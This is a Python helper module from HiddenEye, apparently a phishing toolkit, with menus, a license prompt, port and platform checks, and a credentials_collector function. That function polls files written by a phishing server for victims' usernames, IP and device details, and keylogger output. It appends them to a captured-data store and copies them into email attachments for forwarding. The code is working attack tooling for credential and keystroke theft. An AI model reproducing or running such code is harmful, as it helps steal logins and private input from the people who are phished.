#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
import Defs.ActionManager.Server.server_runner as server_runner
import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
import Defs.LocalizationManager.lang_action_manager.lang_simple_informant as localization
import Defs.LocalizationManager.lang_global_usage as global_localization
import Defs.ThemeManager.theme as theme
from Defs.ImportManager.unsorted_will_be_replaced import chmod
from Defs.ImportManager.unsorted_will_be_replaced import copyfile
from Defs.ImportManager.unsorted_will_be_replaced import getuid
from Defs.ImportManager.unsorted_will_be_replaced import pathlib_Path
from Defs.ImportManager.unsorted_will_be_replaced import platform
from Defs.ImportManager.unsorted_will_be_replaced import requests
from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.ImportManager.unsorted_will_be_replaced import stat
from Defs.ImportManager.unsorted_will_be_replaced import try_to_run_command

default_palette = theme.default_palette


# def license_handler():
#     """ Checks if eula.txt exists, creates one if it doesn't. Checks if "eula = True" is inside.
#
#     Returns:
#         boolean: Returns True if "eula = True" is inside eula.txt, False by default.
#     """
#     eula = pathlib_Path("eula.txt")
#     if eula.exists():
#         with open("eula.txt", "r") as f:
#             if "eula = True" in f.read():
#                 print("Found your license agreement, proceeding...")
#                 return True
#             else:
#                 print("Please read and accept license.")
#                 return False
#     else:
#         eula.touch(mode=0o777, exist_ok=True)
#         eula = open("eula.txt", "w")
#         eula.write(localization.write_eula + "eula = False")
#         eula.close()
#         print("Please accept EULA.")
#         return False


def exit_message(port=80):  # Message when HiddenEye exit
    """Displays preconfigured message when HiddenEye execution ends or user tries to leave app.

    Args: port (int, optional): Will be used as port value if custom one isn't provided. Needed in case user decides
    to restart app again. Defaults to 80.

    Returns:
        method: If no option is selected, exit message returns to self and gets shown again.
    """
    choice = input(localization.lang_exit_message["choice"])
    choice.lower()
    if choice == "r":
        run_command(["sudo", "python3", "HiddenEye.py"])
    elif choice == "m":
        email_prompt.captured_data_email_confirmation(port)
    elif choice == "s":
        server_runner.server_selection(port)
    elif choice == "x":
        run_command("clear")
        print(global_localization.hidden_eye_logo)
        print("                             " + global_localization.by_darksec)
        print("                       " +
              global_localization.official_website_link)
        print(localization.lang_exit_message["help_to_improve_this_tool"])
        print(localization.lang_exit_message["tell_if_page_got_broken"])
        print(
            localization.lang_exit_message["make_your_pull_request_or_issue"])
        print(localization.lang_exit_message["small_disclaimer_suggestion"])
        print(localization.lang_exit_message["forum_suggestion"])
        print(localization.lang_exit_message["financial_support"])
        print(localization.lang_exit_message["thank_you"])
    else:
        run_command("clear")
        return exit_message(port)


def terms_of_service_message():
    """Requests user to provide agreement to license provided.

    Returns:
        boolean: Always returns True, if user doesn't accept agreement - proceeds to exit()
    """
    agreement = license_handler()
    if not agreement:
        print(localization.lang_terms_of_service_message["GPL_3.0"])
        print(
            localization.
            lang_terms_of_service_message["great_power_great_responsibility"])
        print(localization.
              lang_terms_of_service_message["do_you_accept_license"])
        print(localization.
              lang_terms_of_service_message["enter_this_to_confirm"])
        agreement = input(global_localization.input_line)
        if localization.text_to_confirm_license not in agreement:
            print(localization.
                  lang_terms_of_service_message["you_are_not_allowed"])
            exit()
        else:
            eula = open("eula.txt", "w")
            eula.write(localization.write_eula + "eula = True")
            eula.close()
            return True
    else:
        return True


def module_loading_message(option_name):  # This one just show text..
    """Prints "Select any mode" message.  """
    print(option_name + localization.lang_module_loading_message["is_loaded"])
    print(localization.lang_module_loading_message["select_any_mode"])


def credentials_collector():
    """Collects, writes and returns credentials and additional info gathered from target."""
    print(localization.lang_credentials_collector["waiting_for_interaction"])
    while True:
        with open("Server/www/usernames.txt") as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer(localization.
                           lang_credentials_collector["credentials_found"] +
                           "{0}{2}{1}".format(default_palette[2],
                                              default_palette[3], lines))
                pathlib_Path("Server/CapturedData/usernames.txt").touch(
                    mode=0o777, exist_ok=True)
                captured_usernames = open("Server/CapturedData/usernames.txt",
                                          "a")
                new_usernames = open("Server/www/usernames.txt")
                captured_usernames.write(new_usernames.read())
                new_usernames.close()
                captured_usernames.close()
                copyfile(
                    "Server/CapturedData/usernames.txt",
                    "Defs/FeatureManager/EmailManager/attachments/usernames.txt",
                )

                new_usernames = open("Server/www/usernames.txt", "w")
                new_usernames.write("")
                new_usernames.close()

        with open("Server/www/ip.txt") as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer(localization.
                           lang_credentials_collector["device_details_found"] +
                           "{0}{2}{1}".format(default_palette[2],
                                              default_palette[3], lines))
                pathlib_Path("Server/CapturedData/ip.txt").touch(mode=0o777,
                                                                 exist_ok=True)
                captured_ips = open("Server/CapturedData/ip.txt", "a")
                new_ips = open("Server/www/ip.txt")
                captured_ips.write(new_ips.read())
                new_ips.close()
                captured_ips.close()
                copyfile(
                    "Server/CapturedData/ip.txt",
                    "Defs/FeatureManager/EmailManager/attachments/ip.txt",
                )
                new_ips = open("Server/www/ip.txt", "w")
                new_ips.write("")
                new_ips.close()

        creds.close()

        with open("Server/www/KeyloggerData.txt") as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer(global_localization.line_of_dots)
                log_writer(localization.
                           lang_credentials_collector["getting_pressed_keys"] +
                           "{0}{2}{1}".format(default_palette[2],
                                              default_palette[3], lines))
                pathlib_Path("Server/CapturedData/KeyloggerData.txt").touch(
                    mode=0o777, exist_ok=True)
                captured_keys = open("Server/CapturedData/KeyloggerData.txt",
                                     "a")
                new_keys = open("Server/www/KeyloggerData.txt")
                captured_keys.write(new_keys.read())
                new_keys.close()
                captured_keys.close()
                copyfile(
                    "Server/CapturedData/KeyloggerData.txt",
                    "Defs/FeatureManager/EmailManager/attachments/KeyloggerData.txt",
                )
                new_keys = open("Server/www/KeyloggerData.txt", "w")
                new_keys.write("")
                new_keys.close()

                log_writer(global_localization.line_of_dots)

        creds.close()


def log_writer(ctx):  # Writing log
    """I have no idea what it does, someone does, so if you are reading this - explain wtf is this method...

    Args:
        ctx ([type]): [description]
    """
    log_file = open("log.txt", "w")
    log_file.write(
        ctx.replace(default_palette[0], "").replace(
            default_palette[1], "").replace(default_palette[2], "").replace(
                default_palette[3], "").replace(default_palette[4], "") + "\n")
    print(ctx)


def port_selector():  # Requests port input from user
    """Asks user to input number between 1 and 65535.

    Returns:
        string: Returns any number entered if it's between 1 and 65535, if it's not - asks for number again.
    """
    run_command("clear")
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(global_localization.line_of_dots)
    print(localization.lang_port_selector["website_port_selection"])
    print(localization.lang_port_selector["select_any_available_port"])
    print(localization.lang_port_selector["port_suggestion"])
    choice = input(global_localization.input_line)
    try:
        if int(choice) > 65535 or int(choice) < 1:
            return port_selector()
        else:
            return choice
    except:
        return port_selector()


def remove_readonly(func, path, _):
    """Removes read-only state of file (IDK why it exists but it does already, so...)

    Args:
        func ([type]): [description]
        path ([type]): [description]
        _ ([type]): [description]
    """
    chmod(path, mode=stat.S_IWRITE)
    func(path)


def global_message():
    """Sends default HiddenEye header message. (Logo, website link, etc.)"""
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(global_localization.line_of_dots)


# def verify_connection(
#         host="https://dark-sec-official.com"):  # Connection check
#     run_command("clear")
#     try:
#         req = requests.get(host, timeout=25)
#         if req.status_code == 200:
#             print(localization.lang_verify_connection["connected"])
#             pass
#     except ConnectionError:
#         print(global_localization.hidden_eye_logo)
#         print(localization.lang_verify_connection["disconnected"])
#         print(localization.lang_verify_connection["verify_your_connection"])
#         print(localization.lang_verify_connection["continue_warning"])
#         print(localization.lang_verify_connection["continue_confirmation"])
#         internet_choice = input(global_localization.input_line).lower()
#         if internet_choice == "y":
#             pass
#         elif internet_choice == "n":
#             run_command("clear")
#             print(global_localization.hidden_eye_logo)
#             print("                             " +
#                   global_localization.by_darksec)
#             print("                       " +
#                   global_localization.official_website_link)
#             print(localization.lang_exit_message["help_to_improve_this_tool"])
#             print(localization.lang_exit_message["tell_if_page_got_broken"])
#             print(localization.
#                   lang_exit_message["make_your_pull_request_or_issue"])
#             print(
#                 localization.lang_exit_message["small_disclaimer_suggestion"])
#             print(localization.lang_exit_message["forum_suggestion"])
#             print(localization.lang_exit_message["financial_support"])
#             print(localization.lang_exit_message["thank_you"])
#             exit()
#         else:
#             verify_connection()


# def check_permissions():
#     if check_platform("system") == "Linux":
#         if getuid() == 0:
#             print(localization.lang_check_permissions["permissions_granted"])
#         else:
#             print(localization.lang_check_permissions["permissions_denied"])
#             exit()


def check_php():
    try:
        try_to_run_command(["php", "-v"])
        print(localization.lang_check_php["found"])
    except ModuleNotFoundError:
        print(localization.lang_check_php["not-found"])
        exit()


def check_platform(required_data: str):
    """ Checks system for specific platform related data and returns requested value.
    :param required_data: accepts "system" or "architecture"
    :type required_data: requires string input
    :return: returns data specified as required_data, Returns all if required_data isn't specified """
    system = platform.system()
    architecture = platform.machine()
    if required_data == "system":
        return system
    elif required_data == "architecture":
        return architecture
    else:
        return "System: {0}, Architecture: {1}".format(system, architecture)
